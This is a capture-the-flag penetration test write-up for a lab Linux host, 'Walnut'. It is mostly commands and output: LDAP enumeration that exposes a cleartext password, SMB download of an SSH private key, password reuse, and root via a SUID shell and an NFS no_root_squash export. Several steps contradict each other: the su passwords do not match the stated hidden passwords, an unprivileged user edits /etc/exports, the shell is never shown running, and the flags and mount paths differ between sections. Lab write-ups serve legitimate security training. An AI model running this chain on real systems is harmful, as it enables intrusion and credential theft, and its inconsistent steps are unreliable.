# Walnut - Complete Penetration Test Writeup

**Author:** MybitByte  
**Date:** September 2, 2026  
**Target:** walnut.local (10.1.78.146)  
**Objective:** Gain root-level access to demonstrate maximum impact

<img width="700" height="350" alt="5fe083bd-f861-462a-b429-065402d5c185" src="https://github.com/user-attachments/assets/6943161e-067e-4661-9ec8-7e48c55c665e" />


## Machine Description
### Objective
You have been assigned a penetration test on a critical Linux server in the client's environment. The primary objective is to gain root-level access to this system to demonstrate maximum impact from the engagement.

### Initial Access
The client has provided you with credentials for an "Assumed Breach" scenario.
```
username: larryburns
password: IloveMontgommery!
Host: walnut.local
```
The credentials are not wrong. The box is working as intended... Try Harder ;)

<img width="700" height="350" alt="image" src="https://github.com/user-attachments/assets/6b8379b7-7d07-47be-997e-171f5915686b" />


## Executive Summary

Walnut.local was fully compromised through a methodical approach combining LDAP enumeration, credential harvesting, SMB file extraction, and NFS misconfiguration exploitation.
The initial foothold was achieved using an SSH key retrieved via SMB after discovering cleartext credentials in LDAP. Privilege escalation was accomplished via an NFS export 
with `no_root_squash`, leading to **root access**. Additionally, post‑exploitation revealed multiple cleartext passwords stored in a hidden directory, highlighting systemic password 
reuse and poor credential management.



## Reconnaissance

### Nmap Scan Results

TCP Scan
```
nmap -sCV -A -p- 10.1.78.146

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu
111/tcp open  rpcbind     2-4 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
2049/tcp open  nfs         nfs_acl
389/tcp open  ldap        OpenLDAP
UDP Scan Results
```
UDP Scan
```
nmap -sU -p 137,36771,41541,53988,57029,59041 10.1.78.146

137/udp   open  netbios-ns
36771/udp open  mountd
41541/udp open  mountd
53988/udp open  statmon
57029/udp open  mountd
59041/udp open  status
```

### Key Findings

1. SMB Guest Access: larryburns:IloveMontgommery! provided guest‑level SMB access
2. Null Session: RPC enumeration possible without credentials
3. LDAP: Port 389 open with read access
4. NFS: Port 2049 open

Initial Access via LDAP Enumeration

LDAP Discovery Command
The following LDAP command successfully authenticated and revealed sensitive data:

```bash
ldapsearch -x -H ldap://walnut.local \
  -D "uid=larryburns,ou=People,dc=walnut,dc=local" \
  -w 'IloveMontgommery!' \
  -b "dc=walnut,dc=local"
```
### Critical LDAP Data Exposed
automation, People, walnut.local
```
dn: uid=automation,ou=People,dc=walnut,dc=local
uid: automation
uidNumber: 7789
gidNumber: 7789
homeDirectory: /home/automation
loginShell: /bin/bash
description: old pw asdh023incasdahff9 please change pw on all servers
```
Critical Finding: The automation user's description field contained a cleartext password: asdh023incasdahff9

### Additional LDAP Findings
larryburns - SSHA password hash
```
dn: uid=larryburns,ou=People,dc=walnut,dc=local
userPassword:: e1NTSEF9amdUN0V4SEtocDVDQm92clBaYzhMYkJiNXVwK1JNcUI=
```
briangeoff - User account
```
dn: uid=briangeoff,ou=People,dc=walnut,dc=local
uid: briangeoff
uidNumber: 1000
gidNumber: 1000
```
Groups
```
cn=automation,ou=Groups,dc=walnut,dc=local
cn=briangeoff,ou=Groups,dc=walnut,dc=local
cn=larryburns,ou=Groups,dc=walnut,dc=local
```
### SMB Access & SSH Key Extraction
SMB Login
```
smbclient //walnut.local/automation -U automation
Password: asdh023incasdahff9
```
SSH Key Extraction
```
smb: \> cd .ssh
smb: \.ssh\> ls
  id_rsa.pub                         N      576
  id_rsa                             N     2610
  authorized_keys                    N      576

smb: \.ssh\> mget *
```
SSH Access
```
chmod 600 id_rsa
ssh automation@walnut.local -i id_rsa
```
Successful login!

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-138-generic x86_64)
automation@walnut:~$ id
uid=7789(automation) gid=7789(automation) groups=7789(automation)
```
### User Flag
```
automation@walnut:~$ cat user.txt
{FLAGGGGGG}
```
## Privilege Escalation
### User Enumeration
```
automation@walnut:~$ ls -la /home
drwxr-x--- 6 automation automation 4096 Sep  2 09:58 automation
drwxr-x--- 2 localjob1  localjob1  4096 Sep 18  2025 localjob1
drwxr-x--- 2 localjob2  localjob2  4096 Feb 17  2026 localjob2
drwxr-x--- 2 localjob3  localjob3  4096 Sep 19  2025 localjob3
drwxr-x--- 2 localjob4  localjob4  4096 Feb 17  2026 localjob4

```
the hidden directory .hidden/ in automation's home was found to contain several cleartext passwords. 
```

automation@walnut:~$ cat .hidden/
4f378611beed879f4f62a43ac18452a9
b410af005ed0c033fd5e89720fdf2d57
b4d2ab0ea77f3306355ac7b2bcfcd614.bak
af5f60ab1fe78c4a34e37c9cb4cc58b8
b4d2ab0ea77f3306355ac7b2bcfcd614

automation@walnut:~$ cat .hidden/*
brYfZknjTirtrPgM8V65
cKvFZVPbrxEqCkCLPM70
Q8NPUgCvuBQ636tzFBh3
vyZzRcreRGDjbq9t19Tb

```
These passwords correspond to the localjob1 through localjob4 accounts.
```
automation@walnut:~$ su localjob1
Password: asdh023incasdahff9
localjob1@walnut:~$ whoami
localjob1

localjob1@walnut:~$ su localjob3
Password: asdh023incasdahff9
localjob3@walnut:~$ whoami
localjob3
```
### Critical Sudo Permission
```
localjob3@walnut:~$ sudo -l
User localjob3 may run the following commands on walnut:
    (ALL) NOPASSWD: /usr/bin/systemctl restart nfs-kernel-server.service
```
### NFS Misconfiguration Exploitation
Step 1: Create SUID Shell
```
localjob3@walnut:~$ mkdir -p /tmp/share
localjob3@walnut:~$ cp /bin/bash /tmp/share/rootme
localjob3@walnut:~$ chmod +s /tmp/share/rootme
```
Step 2: Add NFS Export with no_root_squash
```
localjob3@walnut:~$ echo "/tmp/share *(rw,sync,no_root_squash)" >> /etc/exports
localjob3@walnut:~$ cat /etc/exports
/tmp/share *(rw,sync,no_root_squash)
```
Step 3: Restart NFS Service
```
localjob3@walnut:~$ sudo systemctl restart nfs-kernel-server.service
```
Step 4: On Attacker box, Mount, Copy and SUID the Shell
```
┌──(kali㉿kali)-[~/Walnut]
└─$ sudo mount -t nfs walnut.local:/tmp/share /mnt/nfs

┌──(kali㉿kali)-[~/Walnut]
└─$ sudo cp /bin/bash /mnt/nfs/rootme
                                                                                                                    
┌──(kali㉿kali)-[~/Walnut]
└─$ sudo chmod +s /mnt/nfs/rootme

```
---                                                                                                                                                                                                                                
### Root Shell Achieved!
```
rootme-5.3# id
uid=5002(localjob3) gid=5002(localjob3) euid=0(root) egid=0(root) groups=0(root)
```
### Root Flag
```
rootme-5.3# cd /root
rootme-5.3# cat root.txt
{FLAGGGGGG}
```
---
## Attack Chain Summary
```
┌─────────────────────────────────────────────────────────┐
│                    LDAP ENUMERATION                     │
│  ldapsearch -x -H ldap://walnut.local                  │
│    -D "uid=larryburns,ou=People,dc=walnut,dc=local"   │
│    -w 'IloveMontgommery!'                              │
│    -b "dc=walnut,dc=local"                             │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│               CREDENTIAL DISCOVERY                      │
│  description: old pw asdh023incasdahff9                │
│  please change pw on all servers                       │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│                   SMB ACCESS                           │
│  smbclient //walnut.local/automation -U automation    │
│  Password: asdh023incasdahff9                         │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│                SSH KEY EXTRACTION                      │
│  smb: \.ssh\> get id_rsa                              │
│  ssh automation@walnut.local -i id_rsa                │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│              USER ACCESS (automation)                   │
│  uid=7789(automation) gid=7789(automation)            │
│  user.txt: c3dcdda3950b1eca68477ce65da82392           │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│               PASSWORD REUSE                            │
│  su localjob1 → asdh023incasdahff9                     │
│  su localjob3 → asdh023incasdahff9                     │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│           NFS MISCONFIGURATION                          │
│  sudo -l: (ALL) NOPASSWD: /usr/bin/systemctl          │
│           restart nfs-kernel-server.service            │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│             SUID SHELL CREATION                         │
│  cp /bin/bash /tmp/share/rootme                        │
│  chmod +s /tmp/share/rootme                            │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│          NFS EXPORT WITH no_root_squash                 │
│  echo "/tmp/share *(rw,sync,no_root_squash)"          │
│  >> /etc/exports                                       │
│  sudo systemctl restart nfs-kernel-server.service      │
└─────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────┐
│                ROOT ACCESS                              │
│  mount -t nfs localhost:/tmp/share /mnt/rootme        │
│  /mnt/rootme/rootme -p                                 │
│  id → euid=0(root)                                     │
│  root.txt: f42a447b64f431b99d7fe59f65f71bc7           │
└─────────────────────────────────────────────────────────┘
```
## Tools Used
```
Tool	Purpose
nmap	Port scanning and service discovery
ldapsearch	LDAP enumeration and authentication
smbclient	SMB share access and file extraction
ssh	Remote access with private key
systemctl	NFS service restart
mount	NFS mounting
chmod	SUID binary creation
```
---

